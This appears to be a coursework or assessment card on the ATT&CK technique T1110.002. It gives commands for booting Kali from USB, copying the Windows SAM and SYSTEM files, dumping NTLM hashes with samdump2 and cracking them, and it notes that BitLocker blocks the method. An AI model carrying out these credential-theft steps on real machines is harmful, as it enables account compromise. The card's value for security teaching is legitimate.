T1110.002

2b
Physical Access: SAM Extraction via Bootable Media
No credentials · No exploits · No network required
0.2 mark

Physical access to an unencrypted Windows Server 2016 machine enables full SAM file extraction without any credentials or vulnerability exploitation.

Procedure

# Boot from Kali Linux live USB fdisk -l # identify Windows partition mount /dev/sda2 /mnt/windows # mount NTFS partition cd /mnt/windows/Windows/System32/config/ cp SAM SYSTEM /media/usb/ # exfiltrate credential files # On attacker machine — extract NTLM hashes samdump2 SYSTEM SAM > hashes.txt # Import hashes.txt into Cain & Abel or Hashcat
⚠ Constraint
BitLocker full-disk encryption blocks partition mounting at step 2. Absent encryption, no credentials, exploits, or network access are required — physical access alone achieves full credential extraction.
